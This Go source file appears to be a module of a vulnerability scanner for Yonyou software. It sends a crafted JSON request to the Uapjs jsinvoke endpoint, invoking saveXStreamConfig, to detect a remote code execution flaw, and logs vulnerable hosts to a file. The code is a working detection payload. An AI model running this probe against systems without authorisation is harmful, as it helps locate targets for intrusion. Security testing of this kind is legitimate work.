package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func UapjsjndiScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	Uapjsjndi := "用友 Uapjs 远程代码执行漏洞"
	urls := address + "/uapjs/jsinvoke/?action=invoke"
	Uapjsjndidata := `{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":[""]}`

	// 发送POST请求
	response, _ := client.Post(urls, "application/json", strings.NewReader(Uapjsjndidata))
	defer response.Body.Close()

	// 读取响应内容
	body16, _ := ioutil.ReadAll(response.Body)

	if response.StatusCode == http.StatusOK {
		if len(body16) == 0 {
			result9 := Uapjsjndi + "：" + urls
			//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
			timestamp := time.Now().Format("20230712")
			filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
			err := Utils.SaveResultToFile(result9, filename) // 保存结果到文本文件
			if err != nil {
				log.Println("保存结果到文件出错:", err)
			} else {

			}
			output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, Uapjsjndi, urls)
			fmt.Println(output)
		}
	} else if response.StatusCode == http.StatusInternalServerError {
		if strings.Contains(string(body16), "GIF89a") {
			output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, Uapjsjndi)
			fmt.Println(output)
		} else {
			result9 := Uapjsjndi + "：" + urls
			timestamp := time.Now().Format("20230712") // 生成当前时间戳
			filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
			err := Utils.SaveResultToFile(result9, filename) // 保存结果到文本文件
			if err != nil {
				log.Println("保存结果到文件出错:", err)
			} else {

			}
			output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, Uapjsjndi, urls)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, Uapjsjndi)
		fmt.Println(output)
	}
}
